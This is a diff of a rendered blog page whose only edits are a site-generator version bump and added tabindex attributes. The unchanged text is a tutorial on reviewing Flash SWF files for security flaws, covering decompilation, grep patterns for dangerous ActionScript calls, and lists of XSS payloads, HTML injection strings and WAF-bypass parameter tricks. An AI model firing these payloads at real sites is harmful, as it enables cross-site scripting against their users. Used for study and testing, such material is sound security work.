@@ -65,7 +65,7 @@ I was close to the success as I quickly found 3 XSS, but unfortunately all my re
     <link rel="icon" type="image/png" href="http://10degres.net/assets/img/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="http://10degres.net/assets/img/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.83.1" />
+    <meta name="generator" content="Hugo 0.90.1" />
   </head>
 
   <body class=" ">
@@ -151,31 +151,31 @@ I was close to the success as I quickly found 3 XSS, but unfortunately all my re
 <a href="https://www.adobe.com/support/flashplayer/debug_downloads.html">Flash Player Plugin content debugger</a> to enable the debug mode of the flash plugin of the browser.<br>
 <a href="http://10degres.net/assets/testflash.txt">testflash.php</a> a quick page I wrote to perform local tests.</p>
 <p>Using the debug version of the flash player (standalone or browser) and with the help of the <a href="https://help.adobe.com/en_US/flex/using/WS2db454920e96a9e51e63e3d11c0bf69084-7fc9.html">MacroMedia config file</a>, the flash log is enabled and will contain the trace setted by the developper:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat ~/mm.cfg
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat ~/mm.cfg
 ErrorReportingEnable=1
 TraceOutputFileEnable=1
 MaxWarnings=50
 AS3Trace=1
 </code></pre></div><h2 id="get-the-code">Get the code</h2>
 <p>1/ Download the SWF:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">wget &lt;url&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">wget &lt;url&gt;
 </code></pre></div><p>2/ Open SWF file with JPEXS Free Flash Decompiler</p>
 <p>3/ Select all:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ctrl+a
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ctrl+a
 </code></pre></div><p>4/ Export:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">right click -&gt; export selection
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">right click -&gt; export selection
 </code></pre></div><p>5/ Remove duplicate files:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">find &lt;export_dir&gt; -type f -name &#34;*_[0123456789]*&#34; -exec rm {} \;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">find &lt;export_dir&gt; -type f -name &#34;*_[0123456789]*&#34; -exec rm {} \;
 </code></pre></div><p><img src="http://10degres.net/images/swf-testing-jpexs.png" alt="SWF testing JPEXS"></p>
 <h2 id="extract-datas">Extract datas</h2>
 <p>Find comments:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">extract-endpoints -d &lt;export_dir&gt; -n &#34;&#34; -r -e &#34;*&#34; -v 1 -c
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">extract-endpoints -d &lt;export_dir&gt; -n &#34;&#34; -r -e &#34;*&#34; -v 1 -c
 </code></pre></div><p>Find hash or interesting keywords:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">extract-endpoints -d &lt;export_dir&gt; -n &#34;&#34; -r -e &#34;*&#34; -v 1 -k
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">extract-endpoints -d &lt;export_dir&gt; -n &#34;&#34; -r -e &#34;*&#34; -v 1 -k
 </code></pre></div><p>Find endpoints:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">extract-endpoints -d &lt;export_dir&gt; -n &#34;&#34; -r -e &#34;*&#34; -v 1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">extract-endpoints -d &lt;export_dir&gt; -n &#34;&#34; -r -e &#34;*&#34; -v 1
 </code></pre></div><p>Find almost everything that could be interesting with <code>flash-regexp.sh</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
 </span><span style="color:#75715e"></span>
 target_dir<span style="color:#f92672">=</span>$1
 
@@ -190,7 +190,7 @@ cat <span style="color:#e6db74">&#34;flash-regexp.txt&#34;</span> | <span style=
 	echo
 <span style="color:#66d9ef">done</span>
 </code></pre></div><p>Which is basically a multitude of grep based on a list I found <a href="http://www.bishopfox.com/dictionaries/Flash%20Regexes.txt">there</a>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Flash XSS (HIGH);;clicktag XSS;;geturl\(.*clicktag.*\)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Flash XSS (HIGH);;clicktag XSS;;geturl\(.*clicktag.*\)
 Flash XSS (HIGH);;getURL XSS;;geturl\(.*(_root\.|_level0\.|_global\.).*\)
 Flash XSS (HIGH);;getURL XSS;;geturl\([^&#39;&#34;.]*\)
 Flash XSS (HIGH);;navigateToURL XSS;;navigateToURL\([^&#39;&#34;.]*\)
@@ -200,19 +200,19 @@ Flash XSS (HIGH);;ExternalInterface.call XSS;;ExternalInterface\.call\(.*(_root\
 </code></pre></div><p><img src="http://10degres.net/images/swf-testing-extract-datas.png" alt="SWF testing extract datas"></p>
 <h2 id="manual-analysis">Manual analysis</h2>
 <p>Enable and check the Flash log:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">cd /usr/lib/adobe-flashplugin
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">cd /usr/lib/adobe-flashplugin
 cp libflashplayer_debug.so libflashplayer.so
 tail -f ~/.macromedia/Flash_Player/Logs/flashlog.txt | grep -a -v AVMINF
 </code></pre></div><p>Locally run the SWF file with all parameters in the test page:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">firefox http://127.0.0.1/testflash/testflash.php?__swf=&lt;MYSWF_FILE&gt;.swf&amp;param1=value1&amp;param2=value2...
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">firefox http://127.0.0.1/testflash/testflash.php?__swf=&lt;MYSWF_FILE&gt;.swf&amp;param1=value1&amp;param2=value2...
 </code></pre></div><p>Find parameters in JPEXS and track them one by one from the initialization to the final use:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ctrl+shift+F + Ignore case -&gt; flashvars
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ctrl+shift+F + Ignore case -&gt; flashvars
 </code></pre></div><p>Find dangerous methods in JPEXS and reverse track the parameters:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ctrl+shift+F + Ignore case -&gt; geturl
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ctrl+shift+F + Ignore case -&gt; geturl
 </code></pre></div><p><img src="http://10degres.net/images/swf-testing-flash-log.jpg" alt="SWF testing flash log"></p>
 <h2 id="take-care-of">Take care of</h2>
 <p>Unsafe methods in Actionscript:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">loadVariables()
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">loadVariables()
 getURL()
 getURLBlankVar()
 getURLParentVar()
@@ -236,27 +236,27 @@ htmlVar
 loadClip
 AddDLL
 </code></pre></div><p>Functions that can load objects, or send/receive/store data:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">XMLLoader, AMFService, SWFLoader, loadVariables, loadMovie,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">XMLLoader, AMFService, SWFLoader, loadVariables, loadMovie,
 loadMovieNum, LoadVars.load, LoadVars.send, NetStream.play,
 getDefinition, getDefinition, FScrollPane.loadScrollContent, XML.load,
 Sound.loadSound, NetStream.play, URLRequest, URLLoader,
 URLStream, LocalConnection, SharedObject
 </code></pre></div><p>Uninitialized global vars (ActionScript 2):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">_root
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">_root
 _global
 _level0
 </code></pre></div><p>Uninitialized global vars (ActionScript 3):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root
 loaderInfo
 parameters
 </code></pre></div><h2 id="xss-payloads">XSS payloads</h2>
 <p>AS2 getURL() / AS3 NavigateToURL():</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">javascript:alert(1)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">javascript:alert(1)
 javascript://adobe.com%0aalert(1)
 data:text/html,&lt;script&gt;alert(1)&lt;script&gt;
 data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 </code></pre></div><p>AS2 fscommand, AS2 .watch, AS3 externalInterface.Call (like PHP preg_replace/e issue):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">alert`0`
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">alert`0`
 %#jsinitfunctio%gn=alert%601%60
 \&#34;))-alert(1)}catch(e){}//
 \&#34;))} catch(e) {alert(1);}//
@@ -266,18 +266,18 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 &#34;%5D);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
 flash.external.ExternalInterface.call(&#34;alert&#34;, &#39;1&#39;);
 </code></pre></div><p>HTML injection:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;img src=&#39;javascript:alert(1)//.swf&#39;&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;img src=&#39;javascript:alert(1)//.swf&#39;&gt;
 &lt;a href=asfunction:System.Security.allowDomain,www.example.com&gt;
 &lt;a href=asfunction:getURL,javascript:alert(1)&gt;
 </code></pre></div><p>WAF bypass:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">param1=value1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">param1=value1
 pa%Xram1=val%Yue1
 pa%=ram1=val%#ue1
 pa%AXram1=val%B#ue1
 File.swf?%#param1=value1&amp;p2=v2
 %#jsinitfunctio%gn=alert%601%60
 </code></pre></div><p>Trigger Error:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">xxx&#34;&#39;(){}\&#34;\&#39;(){}\\&#39;\\&#34;(){}xxx
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">xxx&#34;&#39;(){}\&#34;\&#39;(){}\\&#39;\\&#34;(){}xxx
 </code></pre></div><h2 id="other-tools">Other tools</h2>
 <p><a href="https://www.adobe.com/devnet/flex/flex-sdk-download.html">Adobe Flex SDK</a> to compile Actionscript (mxmlc).<br>
 <a href="https://github.com/irsdl/updated-SWFIntruder">SWFIntruder</a> to test XSS.<br>
